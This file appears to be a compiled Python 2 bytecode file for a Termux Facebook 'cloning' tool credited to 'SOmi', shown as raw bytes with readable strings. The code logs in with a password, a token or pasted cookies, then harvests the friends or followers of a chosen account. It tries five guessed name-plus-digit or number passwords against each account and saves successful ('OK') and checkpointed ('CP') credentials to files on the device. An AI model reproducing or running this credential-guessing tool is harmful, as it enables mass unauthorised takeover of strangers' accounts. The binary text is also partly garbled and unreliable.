ó
O`c           @   sù  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z d  d l m Z d Z d Z e  j d  y e  j d  Wn e k
 rí n Xe j d d	  Z e j d
 d  Z i e e  d 6e e  d 6e e  d 6d d 6d d 6d d 6d d 6d d 6Z e  j d  e  j d  d   Z d   Z d   Z d   Z d   Z d    Z d!   Z  d"   Z! d#   Z" d$   Z# d%   Z$ e% d& k rõe   n  d S('   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionErrort   SOmis%   All rights reserved . Copyright  SOmis   termux-setup-storages   /sdcard/idsg    ÐsAg    8|Ag     Ó@g     ã@s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines   git pullt   clearc          C   sk   y t  d d  }  t   WnJ t t f k
 rf t j d  Hd GHd GHd GHd GHd GHd GHt   n Xd  S(	   Ns   access_token.txtt   rR   s   [1;93m~~~~ Login menu ~~~~t    s,   [1;97m([1;91m1[1;97m) Login with FaceBooks)   [1;97m([1;91m2[1;97m) Login with tokens+   [1;97m([1;91m3[1;97m) Login with cookies(   t   opent   menut   KeyErrort   IOErrort   ost   systemt
   log_menu_s(   t   t_check(    (    s$   /sdcard/jam-decompiled-decompiled.pyt   log_menu#   s    c          C   sh   t  d  }  |  d k r" t   nB |  d k r8 t   n, |  d k rN t   n d GHd GHd GHt   d  S(   Ns   [1;91mChoose â¢â¢> t   1t   2t   3R   s   \ Select valid option (   t	   raw_inputt   log_fbt	   log_tokent
   log_cookieR   (   t   s(    (    s$   /sdcard/jam-decompiled-decompiled.pyR   3   s    


c          C   s  t  j d  Hd GHt d  }  t d  } yµ t j d t d t  j } t j	 |  } d | k r t
 d d	  } | j | d  | j   t   nD d
 | d k rÄ d GHt d  t   n d GHd GHt d  t   Wn d GHd GHt  j d  n Xd  S(   NR   s%   [1;31;1m~~~~ Login with id/pass ~~~~s   [1;92m Id/mail/no: s    [1;93mPassword: s   http://localhost:5000/auth?id=s   &pass=t   locs   access_token.txtt   ws   www.facebook.comt   errors&    User must verify account before logins!   [1;92m Press enter to try again R   s    Id/Pass may be wrongs!    [1;92mPress enter to try again s   Exiting toolt   exit(   R   R   R   t   requestst   gett   uidt   pwdt   textt   jsont   loadsR   t   writet   closeR	   R   (   t   lidt   pwdst   datat   qt   ts(    (    s$   /sdcard/jam-decompiled-decompiled.pyR   B   s2    




c          C   sP   t  j d  Hd GHt d  }  t d d  } | j |   | j   t   d  S(   NR   s!   [1;93m~~~~ Login with token ~~~~s   [1;97m([1;91m+[1;97m) Token s   access_token.txtR   (   R   R   R   R   R$   R%   R	   (   t   tokt   t_s(    (    s$   /sdcard/jam-decompiled-decompiled.pyR   _   s    
c          C   sU  t  j d  Hd GHyÂ t d  }  i
 d d 6d d 6d d	 6d
 d 6d d 6d d 6d d 6d d 6d d 6|  d 6} t j d d | } t j d | j  } | j d  } t	 d d  } | j
 |  | j   t   Wny t k
 rþ d GHt d  t   nS t k
 r$d GHt d  t   n- t j j k
 rPd GHt d  t   n Xd  S(   NR   s    [1;31;1m~~~~ Login Cookies ~~~~s.    [1;97m([1;91m+[1;97m) Paste cookies here: sl   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typet   cookiesG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_t   headerss	   (EAAA\w+)i   s   access_token.txtR   s   	Invalid cookiess!    [1;92mPress enter to try again (   R   R   R   R   R   t   ret   searchR!   t   groupR   R$   R%   R	   t   AttributeErrorR   t   UnboundLocalErrort
   exceptionst   SSLError(   R1   R(   t   c1t   c2t   hasilt   ok(    (    s$   /sdcard/jam-decompiled-decompiled.pyR   j   sD    







c          C   sY  t  j d  y t d d  j   }  Wn1 t t f k
 rY Hd GHt j d  t   n Xy3 t	 j
 d |   } t j | j  } | d } Wnk t t f k
 rÍ Hd GHt  j d	  t j d  t   n. t	 j j k
 rú Hd
 GHt d  t   n Xt  j d  Ht d d  j   } d | GHd | GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s   access_token.txtR   s    [1;31;1mLogin FB id to continuei   s+   https://graph.facebook.com/me?access_token=t   names   	 Account Cheekpoint[0;97ms   rm -rf access_token.txts!   	 Turn on mobile data/wifi[0;97ms6    [1;92mPress enter after turning on mobile data/wifi s   /sdcard/.hst.txts     [1;92mLogged in user: s    [1;93m Active token: s,    ------------------------------------------ s1   [1;97m([1;92m1[1;97m) Crack with Name passwords3   [1;97m([1;92m2[1;97m) Crack with Number passwords#   [1;97m([1;92m3[1;97m) View tokens   [1;97m([1;91m4[1;97m) Logouts+   [1;97m([1;91m5[1;97m) Delete trash files(   R   R   R   t   readR
   R   t   timet   sleepR   R   R   R"   R#   R!   R8   R   R   R	   t   menu_s(   t   tokenR   R)   t   zR+   (    (    s$   /sdcard/jam-decompiled-decompiled.pyR	      sF    

		c          C   s   t  d  }  |  d k r" t   nn |  d k r8 t   nX |  d k rN t   nB |  d k rd t   n, |  d k rz t   n d GHd GHd GHt   d  S(	   Ns   [1;91mChooseâ¢â¢> R   R   R   t   4t   5R   s   	Select valid option(   R   t
   auto_crackt   choice_crackt   v_tokt   loutt   rtrashRB   (   t   ms(    (    s$   /sdcard/jam-decompiled-decompiled.pyRB   ·   s    




c           C   s   y t  d d  j   a WnC t t f k
 r^ t j d  Hd GHd GHt j d  t	   n Xt j d  Hd GHd GHd GHd GHd	 GHd
 GHd GHt
   d  S(   Ns   access_token.txtR   R   s    	 Login FB id to continue[0;97mR   i   s%   [1;31;1m~~~~ Name pass cracking ~~~~s*   [1;97m[[1;94m1[1;97m] Public id clonings*   [1;97m([1;94m2[1;97m) Followers clonings   [1;97m([1;91m0[1;97m) Back(   R   R?   RC   R
   R   R   R   R@   RA   R   t   a_s(    (    (    s$   /sdcard/jam-decompiled-decompiled.pyRG   Ê   s&    c             sc  g  }  g    g   t  d  } | d k r½t j d  Hd GHd GHd GHd GHd GHt  d   t  d   t  d	   t  d
   t  d   t  d  } yi t j d | d t  } t j | j  } | d } t j d  Hd GHt j d  d GHd | GHWn7 t	 t
 f k
 r;d GHd GHd GHt  d  t   n Xt j d | d t  } t j | j  } x| d D]B } | d } | d } | j d  d }	 |  j | d |	  qtWnÃ| d k rPt j d  Hd GHd GHd GHd GHd GHt  d   t  d   t  d	   t  d
   t  d  } ye t j d | d t  } t j | j  } | d } t j d  t   t j d  d | GHWn7 t	 t
 f k
 rÊd GHd GHd GHt  d  t   n Xt j d | d  t d!  } t j | j  } x | d D]B } | d } | d } | j d  d }	 |  j | d |	  qWn0 | d" k rft   n d GHd# t GHd GH|   d$ t t |    GHt j d%  d& GHt j d%  d' d( GHd GH        f d)   }
 t d*  } | j |
 |   d GHd' d( GHd GHd+ GHd, t t    d- t t     GHd GHd' d( GHt  d.  t   d  S(/   Ns   [1;91mâ¢â¢>  R   R   R   s,   [1;31;1m~~~~ Name pass public cracking ~~~~s(   [1;93m For example:12,123,1234,786,1122s'    [1;97m([1;91m1[1;97m)Name + digit: s'    [1;97m([1;91m2[1;97m)Name + digit: s'    [1;97m([1;91m3[1;97m)Name + digit: s'    [1;97m([1;91m4[1;97m)Name + digit: s'    [1;97m([1;91m5[1;97m)Name + digit: s$    [1;97m([1;91m+[1;97m) Enter id: s   https://graph.facebook.com/s   ?access_token=R>   s2   echo -e "	    Name pass public cracking " | lolcats    [1;92mCloning from: s   	 Invalid user [0;97ms!    [1;92mPress enter to try again s   /friends?access_token=R(   t   idt    i    t   |R   s/   [1;31;1m~~~~ Name pass followers cracking ~~~~s(    [1;93mFor example:12,123,1234,786,1122s#    [1;97m([1;91m+[1;97m)Enter id: s5   echo -e "	    Name pass followers cracking " | lolcats    [1;92mPress enter to try again s   /subscribers?access_token=s   &limit=999999t   0s   	Choose valid options    Total ids: g      à?s    [1;92mCrack Running [0;97mi/   t   -c            sn  |  } | j  d  \ } } yE| j    } t j d | d | d t j } t j |  } d | k rÄ d | d | GHt d d	  } | j	 | d | d
  | j
    j | |  nd | d k r+d | d | GHt d d	  } | j	 | d | d
  | j
     j | |  n4| j    }	 t j d | d |	 d t j } t j |  } d | k rÑd | d |	 GHt d d	  } | j	 | d |	 d
  | j
    j | |	  nd | d k r8d | d |	 GHt d d	  } | j	 | d |	 d
  | j
     j | |	  n'| j    }
 t j d | d |
 d t j } t j |  } d | k rÞd | d |
 GHt d d	  } | j	 | d |
 d
  | j
    j | |
  nd | d k rEd | d |
 GHt d d	  } | j	 | d |
 d
  | j
     j | |
  n| j    } t j d | d | d t j } t j |  } d | k rëd | d | GHt d d	  } | j	 | d | d
  | j
    j | |  ntd | d k rRd | d | GHt d d	  } | j	 | d | d
  | j
     j | |  n| j    } t j d | d | d t j } t j |  } d | k rød | d | GHt d d	  } | j	 | d | d
  | j
    j | |  ng d | d k r_d | d | GHt d d	  } | j	 | d | d
  | j
     j | |  n  Wn n Xd  S(   NRP   s   http://localhost:5000/auth?id=s   &pass=R2   R   s   [1;92m[OK] [1;92ms    | s   /sdcard/ids/HOP_OK.txtt   as   
s   www.facebook.comR   s   [1;31;1m[CP] s
   HOP_CP.txts   [1;92m[OK] [1;32m(   t   splitt   lowerR   R   t   headerR!   R"   R#   R   R$   R%   t   appendt   apppend(   t   argt   userR   R>   t   pass1R(   R)   R=   t   cpt   pass2t   pass3t   pass4t   pass5(   t   cpst   okst   p1t   p2t   p3t   p4t   p5(    s$   /sdcard/jam-decompiled-decompiled.pyt   mainB  s     $

$

$

$

$

i   s    [1;92mSomi Cloning Completeds    [1;92mTotal Ok/Cp:t   /s    [1;93mPress enter to back(   R   R   R   R   R   RC   R"   R#   R!   R
   R   RG   t   rsplitRW   t   logoR	   R   t   strt   lenR@   RA   R    t   map(   RN   RM   t   idtR   R)   RD   t   iR   t   nat   nmRh   t   p(    (   Ra   Rb   Rc   Rd   Re   Rf   Rg   s$   /sdcard/jam-decompiled-decompiled.pyRM   â   sÆ    








		!V	)	
c           C   s¡   y t  d d  j   a WnB t t f k
 r] t j d  t GHd GHt j	 d  t
   n Xt j d  t GHt j d  d GHd GHd	 GHd
 GHd GHt   d  S(   Ns   access_token.txtR   R   s(   [1;31;1m~~~ Login FB id to continue ~~~i   s-   echo -e "	    Number Pass Cracking " | lolcatR   s*   [1;97m([1;95m1[1;97m) Public id clonings*   [1;97m([1;95m2[1;97m) Followers clonings   [1;97m([1;91m0[1;97m) Back(   R   R?   RC   R
   R   R   R   Rk   R@   RA   R   t   c_s(    (    (    s$   /sdcard/jam-decompiled-decompiled.pyRH   ¥  s"    c             s{  g  }  g    g   t  d  } | d k r¬t j d  t GHd GHd GHt  d   t  d   t  d   t  d	   t  d
   t  d  } yc t j d | d t  } t j | j	  } | d } t j d  t GHt j d  d | GHWn7 t
 t f k
 r*d GHd GHd GHt  d  t   n Xt j d | d t  } t j | j	  } x*| d D]B } | d } | d } | j d  d }	 |  j | d |	  qcWnÙ| d k rUt j d  t GHd GHt j d  d GHt  d   t  d   t  d   t  d	   t  d
   t  d  } ym t j d | d t  } t j | j	  } | d } t j d  t GHd GHt j d  d GHd | GHWn7 t
 t f k
 rÏd GHd GHd GHt  d  t   n Xt j d | d t d  } t j | j	  } x | d D]B } | d } | d } | j d  d }	 |  j | d |	  qWn0 | d k rkt   n d GHd t GHd GHt   d t t |    GHt j d   d! GHt j d   d GHd" d# GHd" d# GHd GH        f d$   }
 t d%  } | j |
 |   d GHd" d# GHd GHd& GHd' t t    d( t t     GHd GHd" d# GHd GHt  d)  t   d  S(*   Ns   [1;91mChooseâ¢â¢>R   R   s/   [1;31;1m ~~~~ Number pass public cracking ~~~~R   s#    [1;97m([1;91m1[1;97m)Password: s#    [1;97m([1;91m2[1;97m)Password: s#    [1;97m([1;91m3[1;97m)Password: s#    [1;97m([1;91m4[1;97m)Password: s#    [1;97m([1;91m5[1;97m)Password: s#    [1;97m([1;91m+[1;97m)Enter id: s   https://graph.facebook.com/s   ?access_token=R>   s-   echo -e "	    Number Pass Cracking " | lolcats    Cloning from: s   	 Invalid user [0;97ms    Press enter to try again s   /friends?access_token=R(   RN   RO   i    RP   R   s   Press enter to try again s   /subscribers?access_token=s   &limit=999999RQ   s   	 Choose valid options    Total ids: g      à?s    [1;92mCrack Running [0;97mi/   RR   c            s  |  } | j  d  \ } } yõt j d | d  d t j } t j |  } d | k r´ d | d  GHt d d	  } | j | d  d
  | j	    j
 |   n[d | d k rd | d  GHt d d	  } | j | d  d
  | j	     j
 |   nôt j d | d  d t j } t j |  } d | k r±d | d  GHt d d	  } | j | d  d
  | j	    j
 |   n^d | d k rd | d  GHt d d	  } | j | d  d
  | j	     j
 |   n÷t j d | d  d t j } t j |  } d | k r®d | d  GHt d d	  } | j | d  d
  | j	    j
 |   nad | d k rd | d  GHt d d	  } | j | d  d
  | j	     j
 |   nút j d | d  d t j } t j |  } d | k r«d | d  GHt d d	  } | j | d  d
  | j	    j
 |   ndd | d k rd | d  GHt d d	  } | j | d  d
  | j	     j |   ný t j d | d  d t j } t j |  } d | k r¨d | d  GHt d d	  } | j | d  d
  | j	    j
 |   ng d | d k rd | d  GHt d d	  } | j | d  d
  | j	     j |   n  Wn n Xd  S(   NRP   s   http://localhost:5000/auth?id=s   &pass=R2   R   s   [1;92m[SOMI-OK] [1;32ms    | s   /sdcard/ids/HOP_OK.txtRS   s   
s   www.facebook.comR   s   [1;31;1m[CP] s
   HOP_CP.txts   [1;92m[OK] [1;32m(   RT   R   R   RV   R!   R"   R#   R   R$   R%   RW   RX   (   RY   RZ   R   R>   R(   R)   R=   R\   (   Ra   Rb   R[   R]   R^   R_   R`   (    s$   /sdcard/jam-decompiled-decompiled.pyRh     s    $

$

$

$

$

i   s    [1;92mCrack Dones   [1;92m Total Ok/Cp:Ri   s   [1;93m Press enter to back(   R   R   R   Rk   R   R   RC   R"   R#   R!   R
   R   RH   Rj   RW   RG   R	   R   Rt   Rl   Rm   R@   RA   R    Rn   (   RN   RM   Ro   R   R)   RD   Rp   R   Rq   Rr   Rh   Rs   (    (   Ra   Rb   R[   R]   R^   R_   R`   s$   /sdcard/jam-decompiled-decompiled.pyRt   »  sÄ    








			!Q	)	
t   __main__(&   R   t   sysR@   t   datetimeR3   t	   threadingR"   t   randomR   t   hashlibt	   cookielibt   uuidt   multiprocessing.poolR    t   requests.exceptionsR   t
   __author__t   __copyrightR   t   mkdirt   OSErrort   randintt   bdt   simt   reprRV   R   R   R   R   R   R	   RB   RG   RM   RH   Rt   t   __name__(    (    (    s$   /sdcard/jam-decompiled-decompiled.pyt   <module>   sD   
					%	(			Ã		½


	